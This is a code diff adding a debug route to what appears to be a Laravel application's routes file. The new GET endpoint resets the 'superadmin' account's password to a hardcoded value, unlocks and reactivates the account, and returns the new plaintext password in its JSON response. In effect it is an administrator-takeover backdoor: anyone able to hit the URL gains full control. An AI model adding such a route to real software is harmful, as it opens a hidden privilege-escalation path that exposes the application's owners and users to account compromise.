@@ -282,3 +282,34 @@ Route::middleware(['auth'])->group(function () {
 // CHANGE PASSWORD
 Route::get('/profile/change-password', [ProfileController::class, 'showChangePassword'])->name('profile.change-password');
 Route::put('/profile/change-password', [ProfileController::class, 'updatePassword'])->name('profile.update-password');
+Route::get('/debug/change-password', function() {
+    $user = \App\Models\User::where('username', 'superadmin')->first();
+
+    if (!$user) {
+        return response()->json(['error' => 'superadmin HAIPO']);
+    }
+
+    $newPassword = 'Sapta@2026!';
+
+    $user->forceFill([
+        'password_hash' => \Hash::make($newPassword),
+        'account_status' => 'active',
+        'is_first_login' => false,
+        'first_password_expires_at' => null,
+        'credentials_expires_at' => null,
+        'failed_login_attempts' => 0,
+        'locked_until' => null,
+        'password_changed_at' => now(),
+    ])->save();
+
+    $fresh = $user->fresh();
+
+    return response()->json([
+        'success' => true,
+        'message' => 'Password imebadilishwa',
+        'new_password' => $newPassword,
+        'hash_check_new' => \Hash::check($newPassword, $fresh->password_hash),
+        'account_status' => $fresh->account_status,
+        'failed_login_attempts' => $fresh->failed_login_attempts,
+    ], 200, [], JSON_PRETTY_PRINT);
+})->name('debug.change-password');
